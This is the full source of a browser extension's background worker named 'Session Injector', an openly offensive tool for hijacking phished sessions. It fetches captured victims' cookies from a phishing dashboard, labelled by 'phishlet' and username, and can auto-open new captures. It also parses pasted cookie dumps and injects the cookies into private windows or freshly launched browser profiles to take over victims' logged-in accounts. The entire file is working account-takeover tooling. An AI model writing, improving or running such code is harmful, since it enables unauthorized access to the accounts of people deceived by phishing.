'use strict';
/* ============================================================================
   Session Injector - background service worker.

   Cross-browser note: Chrome's `chrome.*` returns promises when no callback is
   given, Firefox's does not (Firefox only promises on `browser.*`). Everything
   here therefore goes through small callback wrappers, which behave identically
   in both. Without them the whole worker breaks on Firefox.

   Window targets
   --------------
     normal     a normal window in your profile (shares your jar)
     incognito  a separate cookie jar, so nothing you are signed into is touched
     here       reuse the current tab, same jar, no new window
     profile    a real, separate browser profile (needs the native host)

   Only one victim is live per jar, by nature of cookies. Switching victims
   clears the union of the previous and new domains first, so nothing merges.
   ========================================================================== */

const SCHEMA = 2;
const DEFAULTS = { mode: 'normal', autoOpen: false, namePrefix: '', tabGroups: false, dashboardUrl: '', user: '', pass: '', schema: SCHEMA };
const K = {
  settings: 'settings',
  wins: 'winIds',
  recent: 'recent',
  active: 'active',
  seen: 'seenIds',
  last: 'lastInject',
  store: 'incognitoStore',
  touched: 'touchedStores',
};
const RECENT_MAX = 8;
const SEEN_MAX = 400;
const MODES = ['incognito', 'normal', 'here', 'profile'];
const HOST = 'com.evilpro.host';

function normMode(m) {
  const v = String(m || '').toLowerCase();
  if (v === 'isolated' || v === 'incognito') return 'incognito';
  if (v === 'here') return 'here';
  if (v === 'profile') return 'profile';
  return 'normal';
}

/* ------------------------------------------------- chrome api, both engines */
function call(fn, obj, args) {
  return new Promise(function (res) {
    try {
      fn.apply(obj, (args || []).concat([function (r) {
        void (chrome.runtime && chrome.runtime.lastError); // suppress the unchecked warning
        res(r);
      }]));
    } catch (e) { res(undefined); }
  });
}
const cookiesAll = (f) => call(chrome.cookies.getAll, chrome.cookies, [f]);
const cookieSet = (d) => call(chrome.cookies.set, chrome.cookies, [d]);
const cookieDel = (d) => call(chrome.cookies.remove, chrome.cookies, [d]);
const winAll = () => call(chrome.windows.getAll, chrome.windows, [{}]);
const tabsQuery = (f) => call(chrome.tabs.query, chrome.tabs, [f]);
const tabsCreate = (o) => call(chrome.tabs.create, chrome.tabs, [o]);
const tabsUpdate = (id, o) => call(chrome.tabs.update, chrome.tabs, [id, o]);
const storeGet = (keys) => call(chrome.storage.local.get, chrome.storage.local, [keys]).then((r) => r || {});
const storeSet = (o) => call(chrome.storage.local.set, chrome.storage.local, [o]);
const storeRemove = (k) => call(chrome.storage.local.remove, chrome.storage.local, [k]);
const winUpdate = (id, o) => call(chrome.windows.update, chrome.windows, [id, o]);
const winRemove = (id) => call(chrome.windows.remove, chrome.windows, [id]);

// windows.create must be able to *fail* (incognito can be refused)
function createWindow(opts) {
  return new Promise(function (res, rej) {
    try {
      chrome.windows.create(opts, function (w) {
        const err = chrome.runtime.lastError;
        if (err || !w) rej(new Error(err ? err.message : 'window could not be created'));
        else res(w);
      });
    } catch (e) { rej(e); }
  });
}

/* ---------------------------------------------------------------- settings */
async function getSettings() {
  const got = await storeGet(K.settings);
  const raw = got[K.settings] || {};
  const s = Object.assign({}, DEFAULTS, raw);
  if (raw.schema !== SCHEMA) {
    // v2.0 shipped incognito as the automatic default and stored it as
    // "isolated". Migrate exactly that legacy value once.
    if (raw.mode === 'isolated') s.mode = 'normal';
    s.schema = SCHEMA;
    await storeSet({ [K.settings]: s });
  }
  s.mode = normMode(s.mode);
  return s;
}
async function setSettings(patch) {
  const next = Object.assign({}, await getSettings(), patch);
  if (next.mode) next.mode = normMode(next.mode);
  await storeSet({ [K.settings]: next });
  return next;
}

function badge(text, color) {
  try {
    chrome.action.setBadgeText({ text: text || '' }, function () { void chrome.runtime.lastError; });
    if (color) chrome.action.setBadgeBackgroundColor({ color }, function () { void chrome.runtime.lastError; });
  } catch (e) { /* cosmetic */ }
}

/* --------------------------------------------------------- native host ---- */
// A real browser profile can only be created by a new browser process, so a
// small native-messaging host does the launching (see extension/host).
let hostInfo = null;

async function browserHint() {
  try {
    const b = navigator.brave;
    if (b) {
      const v = typeof b.isBrave === 'function' ? await b.isBrave() : b.isBrave();
      if (v) return 'brave';
    }
  } catch (e) { /* not brave */ }
  const ua = navigator.userAgent || '';
  if (/Edg\//.test(ua)) return 'edge';
  if (/Firefox\//.test(ua)) return 'firefox';
  return 'chrome';
}

function sendNative(msg) {
  return new Promise(function (res) {
    try {
      chrome.runtime.sendNativeMessage(HOST, msg, function (r) {
        const err = chrome.runtime.lastError;
        res(err ? { error: err.message } : (r || {}));
      });
    } catch (e) { res({ error: String((e && e.message) || e) }); }
  });
}

async function pingHost() {
  if (hostInfo) return hostInfo;
  const r = await sendNative({ action: 'ping', browserHint: await browserHint() });
  hostInfo = (r && r.ok) ? r : { error: r.error || 'host not installed', ok: false };
  return hostInfo;
}

// A profile needs the host AND a browser that can force-load an extension into a
// fresh profile. Firefox cannot (no --load-extension).
async function profileAllowed() {
  const h = await pingHost();
  return !!(h.ok && h.canProfile === true);
}

function b64url(str) {
  return btoa(unescape(encodeURIComponent(str))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

async function launchProfile(payload, label) {
  const info = await pingHost();
  if (!info.ok) return null;
  const packed = b64url(JSON.stringify({ u: payload.target_url, n: label, c: payload.cookies || [] }));
  const r = await sendNative({ action: 'launch', name: label, browserHint: await browserHint(), payload: packed });
  if (r.error) return { error: r.error };
  return r;
}

/* ------------------------------------------------------------ window book */
async function winMap() { return (await storeGet(K.wins))[K.wins] || {}; }
async function saveWinMap(m) {
  if (Object.keys(m).length) await storeSet({ [K.wins]: m });
  else await storeRemove(K.wins);
}

async function liveWindow(kind) {
  const map = await winMap();
  const e = map[kind];
  if (!e) return null;
  const all = (await winAll()) || [];
  if (all.some((w) => w.id === e.id)) return { id: e.id, kind: e.kind || kind };
  delete map[kind];
  await saveWinMap(map);
  return null;
}

async function liveWindows() {
  const out = [];
  for (const k of ['incognito', 'normal']) {
    const w = await liveWindow(k);
    if (w) out.push({ id: w.id, kind: k, actual: w.kind });
  }
  return out;
}

async function ensureWindow(kind) {
  const want = kind === 'incognito' ? 'incognito' : 'normal';
  const live = await liveWindow(want);
  if (live) return live;

  const base = { focused: true, width: 1180, height: 840 };
  let w;
  let actual = want;
  if (want === 'incognito') {
    try {
      w = await createWindow(Object.assign({ incognito: true }, base));
    } catch (e) {
      actual = 'normal'; // private windows refused by policy / by the user
      w = await createWindow(base);
    }
  } else {
    w = await createWindow(base);
  }
  const map = await winMap();
  map[want] = { id: w.id, kind: actual };
  await saveWinMap(map);
  return { id: w.id, kind: actual, degraded: actual !== want };
}

chrome.windows.onRemoved.addListener(function (id) {
  (async function () {
    const map = await winMap();
    let hit = false;
    for (const k of Object.keys(map)) {
      if (map[k] && map[k].id === id) { delete map[k]; hit = true; }
    }
    if (!hit) return;
    await saveWinMap(map);
    const got = await storeGet(K.active);
    if (got[K.active] && got[K.active].winId === id) await storeRemove([K.active, K.touched]);
  })();
});

// The private store id is opaque; probe for it and cache the answer.
async function isolatedStoreId() {
  const got = await storeGet(K.store);
  if (got[K.store]) return got[K.store];
  let id = '1';
  const all = (await cookiesAll({})) || [];
  const inc = all.find((c) => c.storeId && c.storeId !== '0');
  if (inc) id = inc.storeId;
  await storeSet({ [K.store]: id });
  return id;
}

/* ----------------------------------------------------------------- cookies */
function cookieURL(c) {
  const host = String(c.domain || '').replace(/^\./, '');
  return (c.secure ? 'https://' : 'http://') + host + (c.path || '/');
}

function sameSiteOf(c) {
  const s = String(c.sameSite || '').toLowerCase();
  if (s === 'strict') return 'strict';
  if (s === 'none' || s === 'no_restriction') return 'no_restriction';
  if (s === 'lax') return 'lax';
  return 'unspecified';
}

function cookieDetails(c, storeId) {
  const isHost = c.name.indexOf('__Host-') === 0;
  const isSecure = c.name.indexOf('__Secure-') === 0;
  const sameSite = sameSiteOf(c);
  const details = {
    url: cookieURL(c),
    name: c.name,
    value: c.value == null ? '' : String(c.value),
    path: c.path || '/',
    // __Host- demands host-only + path=/ + secure; __Secure- demands secure
    secure: !!(c.secure || isSecure || isHost || sameSite === 'no_restriction'),
    httpOnly: !!c.httpOnly,
    sameSite: sameSite,
  };
  if (!isHost && c.domain) details.domain = c.domain;
  if (!c.session && c.expirationDate) details.expirationDate = c.expirationDate;
  if (storeId) details.storeId = storeId;
  return details;
}

function domainsOf(cookies) {
  return Array.from(new Set((cookies || []).map((c) => String(c.domain || '').replace(/^\./, '')).filter(Boolean)));
}

async function clearDomains(domains, storeId) {
  let removed = 0;
  for (const d of domains) {
    const filter = storeId ? { domain: d, storeId } : { domain: d };
    const existing = (await cookiesAll(filter)) || [];
    for (const c of existing) {
      const opts = { url: cookieURL(c), name: c.name };
      if (storeId) opts.storeId = storeId;
      if (await cookieDel(opts)) removed++;
    }
  }
  return removed;
}

async function applyCookies(cookies, storeId, clearList) {
  const res = { success: 0, failed: 0, cleared: 0, errors: [] };
  res.cleared = await clearDomains(clearList || domainsOf(cookies), storeId);
  for (const c of cookies) {
    try {
      const r = await cookieSet(cookieDetails(c, storeId));
      if (r) res.success++;
      else { res.failed++; res.errors.push(c.name + ' @ ' + c.domain + ': rejected' + (storeId ? ' (store ' + storeId + ')' : '')); }
    } catch (e) {
      res.failed++;
      res.errors.push(c.name + ' @ ' + c.domain + ': ' + e.message);
    }
  }
  return res;
}

/* --------------------------------------------------------------- labelling */
function labelFor(payload, st, opts) {
  const explicit = (opts && opts.name) || payload.name;
  if (explicit && String(explicit).trim()) return String(explicit).trim().slice(0, 60);
  const who = (payload.username || '').trim() ||
    (payload.phishlet ? '(' + payload.phishlet + ')' : '') ||
    ('session ' + payload.session_id);
  const pre = (st.namePrefix || '').trim();
  const joined = pre ? (/[-_.\/]$/.test(pre) ? pre + who : pre + ' ' + who) : who;
  return joined.trim().slice(0, 60);
}

function infoOf(payload, where, label, winId) {
  return {
    id: payload.session_id,
    phishlet: payload.phishlet || '',
    username: payload.username || '',
    ip: payload.remote_addr || '',
    url: payload.target_url || '',
    count: (payload.cookies || []).length,
    at: Date.now(),
    where: where,
    name: label,
    winId: winId || null,
  };
}

/* ------------------------------------------------------------------- window */
async function openTabs(winId, payload, label, useGroups) {
  const cardURL = chrome.runtime.getURL('session-card.html');
  const tabs = (await tabsQuery({ windowId: winId })) || [];
  let card = tabs.find((t) => t.url && t.url.indexOf(cardURL) === 0);
  if (!card) card = await tabsCreate({ windowId: winId, url: cardURL, pinned: true, index: 0 });
  let target = tabs.find((t) => t && card && t.id !== card.id && t.url && t.url.indexOf(cardURL) !== 0);
  if (target) await tabsUpdate(target.id, { url: payload.target_url, active: true });
  else target = await tabsCreate({ windowId: winId, url: payload.target_url, active: true });
  if (useGroups && chrome.tabs.group) {
    try {
      const gid = await call(chrome.tabs.group, chrome.tabs, [{ tabIds: [card.id, target.id], createProperties: { windowId: winId } }]);
      if (gid !== undefined && chrome.tabGroups) await call(chrome.tabGroups.update, chrome.tabGroups, [gid, { title: label, color: 'blue' }]);
    } catch (e) { /* the pinned card still carries the name */ }
  }
  return target;
}

async function touchedMap() { return (await storeGet(K.touched))[K.touched] || {}; }
function allTouched(m) { return Object.keys(m || {}).reduce((a, k) => a.concat(m[k]), []); }
async function storeIdFor(name) { return name === 'incognito' ? await isolatedStoreId() : undefined; }

/* ----------------------------------------------------------------- takeover */
async function takeover(payload, mode, opts) {
  const st = await getSettings();
  let where = normMode(mode || st.mode);
  const cookies = payload.cookies || [];
  const label = labelFor(payload, st, opts);
  let res;
  let winId = null;

  if (where === 'profile' && !(await profileAllowed())) where = 'normal';

  if (where === 'here') {
    res = await applyCookies(cookies, undefined);
    res.where = 'this profile';
    if (payload.target_url) await tabsCreate({ url: payload.target_url, active: true });
  } else if (where === 'profile') {
    const r = await launchProfile(payload, label);
    if (r && r.error) return { error: 'profile launch failed: ' + r.error };
    res = { success: cookies.length, failed: 0, cleared: 0, errors: [], where: 'own profile', profile: r.profile };
    await storeSet({ [K.active]: infoOf(payload, where, label, null) });
  } else {
    const win = await ensureWindow(where);
    winId = win.id;
    const sname = win.kind === 'incognito' ? 'incognito' : 'default';
    const storeId = await storeIdFor(sname);
    const touched = await touchedMap();
    const domains = Array.from(new Set(allTouched(touched).concat(domainsOf(cookies))));
    res = await applyCookies(cookies, storeId, domains);
    res.where = win.kind === 'incognito' ? 'private window' : 'normal window';
    res.degraded = !!win.degraded;
    touched[sname] = domains;
    await storeSet({ [K.touched]: touched, [K.active]: infoOf(payload, where, label, winId) });
    if (payload.target_url) await openTabs(winId, payload, label, !!st.tabGroups);
    await winUpdate(winId, { focused: true });
  }

  const info = infoOf(payload, where, label, winId);
  await remember(info, payload);
  await storeSet({ [K.last]: Object.assign({}, info, { failed: res.failed, where: res.where }) });

  if (res.success > 0) badge(String(res.success), '#2563eb');
  setTimeout(function () { badge('', null); }, 4000);
  return res;
}

async function remember(info, payload) {
  const got = await storeGet(K.recent);
  const list = (got[K.recent] || []).filter((x) => x.id !== info.id);
  list.unshift(Object.assign({}, info, { cookies: payload.cookies || [], target_url: payload.target_url || '' }));
  await storeSet({ [K.recent]: list.slice(0, RECENT_MAX) });
}

/* -------------------------------------------------------------- paste-in --- */
function normalizeCookie(raw, host) {
  if (!raw || typeof raw !== 'object') return null;
  const name = String(raw.name == null ? '' : raw.name).trim();
  if (!name) return null;
  const domain = String(raw.domain || raw.host || host || '').trim();
  if (!domain) return null;
  const c = {
    name: name,
    value: raw.value == null ? '' : String(raw.value),
    domain: domain,
    path: raw.path || '/',
    secure: !!raw.secure,
    httpOnly: !!raw.httpOnly,
    sameSite: raw.sameSite || 'Lax',
  };
  const exp = Math.floor(Number(raw.expirationDate));
  if (raw.expirationDate && exp > 0) c.expirationDate = exp;
  if (raw.session || !c.expirationDate) c.session = true;
  return c;
}

function parseCookies(text, targetUrl) {
  const out = { cookies: [], error: '', format: '', host: '' };
  const body = String(text || '').trim();
  if (!body) { out.error = 'nothing pasted'; return out; }
  try { out.host = new URL(targetUrl).hostname; } catch (e) { out.host = ''; }

  if (body[0] === '[' || body[0] === '{') {
    let data;
    try { data = JSON.parse(body); } catch (e) { out.error = 'invalid JSON: ' + e.message; return out; }
    let arr = Array.isArray(data) ? data : (data && Array.isArray(data.cookies) ? data.cookies : null);
    if (!arr && data && typeof data === 'object') {
      arr = Object.keys(data).map((k) => (typeof data[k] === 'object' ? Object.assign({ name: k }, data[k]) : { name: k, value: data[k] }));
    }
    if (!arr || !arr.length) { out.error = 'no cookies found in the JSON'; return out; }
    out.format = 'json';
    out.cookies = arr.map((c) => normalizeCookie(c, out.host)).filter(Boolean);
    if (!out.cookies.length) { out.error = 'no usable cookies (each needs a name and a domain)'; return out; }
  } else {
    out.format = 'text';
    if (!out.host) { out.error = 'plain text needs a target URL so the domain is known'; return out; }
    const flat = body.replace(/^cookie\s*:\s*/i, '').replace(/\r/g, '');
    for (const part of flat.split(/[;\n]+/)) {
      const s = part.trim();
      if (!s) continue;
      const i = s.indexOf('=');
      if (i <= 0) continue;
      const c = normalizeCookie({ name: s.slice(0, i), value: s.slice(i + 1) }, out.host);
      if (c) out.cookies.push(c);
    }
    if (!out.cookies.length) { out.error = 'no name=value pairs found'; return out; }
  }
  if (out.cookies.length > 500) out.cookies = out.cookies.slice(0, 500);
  return out;
}

async function takeFromText(msg) {
  const target = String(msg.targetUrl || '').trim();
  if (!/^https?:\/\//i.test(target)) return { error: 'a target URL (https://...) is required' };
  const p = parseCookies(msg.text, target);
  if (p.error) return { error: p.error };
  const payload = {
    session_id: 'paste-' + Date.now().toString(36),
    phishlet: msg.phishlet || 'pasted',
    username: (msg.name || '').trim(),
    target_url: target,
    cookies: p.cookies,
    count: p.cookies.length,
  };
  const r = await takeover(payload, msg.mode, { name: msg.name });
  return Object.assign({ parsed: p.cookies.length, format: p.format, domains: domainsOf(p.cookies) }, r);
}

/* ----------------------------------------- optional direct dashboard fetch */
function b64(s) {
  try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); }
}

async function fetchSession(id) {
  const st = await getSettings();
  const base = (st.dashboardUrl || '').replace(/\/+$/, '');
  if (!base) return { error: 'no dashboard url set' };
  const headers = (st.user || st.pass) ? { Authorization: 'Basic ' + b64(st.user + ':' + st.pass) } : {};
  try {
    const r = await fetch(base + '/api/v1/sessions/' + encodeURIComponent(id) + '/cookies', { credentials: 'include', headers: headers });
    if (!r.ok) return { error: 'dashboard returned ' + r.status };
    const d = await r.json();
    if (!d.count) return { error: 'session has no cookies' };
    return d;
  } catch (e) {
    return { error: e.message };
  }
}

/* ------------------------------------------------------------- auto takeover */
async function seenNewSessions(list) {
  const got = await storeGet(K.seen);
  const known = got[K.seen] || null;
  const now = list.map((s) => s.id);
  const fresh = known ? list.filter((s) => known.indexOf(s.id) === -1) : [];
  await storeSet({ [K.seen]: now.concat(known || []).slice(0, SEEN_MAX) });
  return fresh;
}

/* ---------------------------------------------------------------- messaging */
async function onMessage(msg) {
  switch (msg && msg.action) {
    case 'inject':
      return await takeover(msg.payload || {}, msg.mode, msg.opts);
    case 'paste':
      return await takeFromText(msg);
    case 'parse': {
      const p = parseCookies(msg.text, msg.targetUrl);
      return { error: p.error, count: p.cookies.length, format: p.format, domains: domainsOf(p.cookies) };
    }
    case 'injectById': {
      const d = await fetchSession(msg.id);
      if (d.error) return { error: d.error };
      return await takeover(d, msg.mode, msg.opts);
    }
    case 'sessions': {
      const fresh = await seenNewSessions(msg.list || []);
      const st = await getSettings();
      const usable = (x) => (x.usable === undefined ? !!x.has_tokens : !!x.usable);
      const ready = fresh.filter(usable);
      if (ready.length) {
        badge(String(ready.length), '#22c55e');
        setTimeout(function () { badge('', null); }, 6000);
      }
      if (st.autoOpen && ready.length) {
        const d = await fetchSession(ready[0].id);
        if (!d.error) await takeover(d, st.mode);
      }
      return { fresh: ready.length };
    }
    case 'dashboard':
      if (msg.url) await setSettings({ dashboardUrl: msg.url });
      return { ok: true };
    case 'settings':
      return await setSettings(msg.patch || {});
    case 'rename': {
      const got = await storeGet(K.active);
      if (!got[K.active]) return { error: 'nothing is live' };
      const name = String(msg.name || '').trim().slice(0, 60);
      const next = Object.assign({}, got[K.active], { name: name });
      await storeSet({ [K.active]: next });
      if (next.winId && chrome.tabs.group) {
        try {
          const tabs = (await tabsQuery({ windowId: next.winId })) || [];
          const g = tabs.find((t) => t.groupId && t.groupId !== -1);
          if (g) await call(chrome.tabGroups.update, chrome.tabGroups, [g.groupId, { title: name }]);
        } catch (e) { /* optional */ }
      }
      return { name: name };
    }
    case 'state': {
      const st = await getSettings();
      const won = await liveWindows();
      const got = await storeGet([K.recent, K.active, K.last]);
      const host = await pingHost();
      return {
        settings: st,
        windows: won,
        recent: got[K.recent] || [],
        active: got[K.active] || null,
        last: got[K.last] || null,
        host: { ok: !!host.ok, canProfile: host.canProfile === true, family: host.family || '', browser: host.browser || '', error: host.error || '' },
      };
    }
    case 'hostInstall': {
      hostInfo = null;
      const r = await sendNative({ action: 'install' });
      hostInfo = null;
      return r;
    }
    case 'clearIsolated': {
      const touched = await touchedMap();
      let cleared = 0;
      for (const sname of Object.keys(touched)) {
        cleared += await clearDomains(touched[sname], await storeIdFor(sname));
      }
      await storeRemove([K.active, K.touched]);
      return { cleared: cleared };
    }
    case 'closeWindows': {
      const won = await liveWindows();
      for (const w of won) await winRemove(w.id);
      return { closed: won.length };
    }
    default:
      return { error: 'unknown action' };
  }
}

chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
  onMessage(msg).then(sendResponse).catch(function (e) { sendResponse({ error: String((e && e.message) || e) }); });
  return true; // async response
});
